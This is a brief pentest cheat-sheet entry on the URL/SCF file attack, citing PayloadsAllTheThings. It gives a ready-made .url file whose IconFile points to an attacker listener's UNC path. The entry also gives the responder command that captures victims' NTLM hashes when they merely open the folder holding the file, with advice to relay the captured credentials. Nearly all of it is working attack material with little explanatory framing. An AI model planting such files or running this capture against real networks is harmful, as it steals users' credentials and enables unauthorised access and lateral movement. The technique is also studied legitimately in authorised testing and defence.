### URL File Attack AKA SCF Attack

### File
` saveas: "@something.url" `
```html
[InternetShortcut] 
URL=blah 
WorkingDirectory=blah 
IconFile=\\<listener IP: x.x.x.x>\%USERNAME%.icon 
IconIndex=1
```
this file has to be in victim machine folder

```sh
> responder -I <interface> -v

# let the victim navigate to the URL FIle in victim machine. once the folder where files in loaded, check responder.
# hashes will be captured in the responder.

# just load is enough. no need of executing the url file by victim.

# Try relaying the creds after responder catches it.

```


### Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share 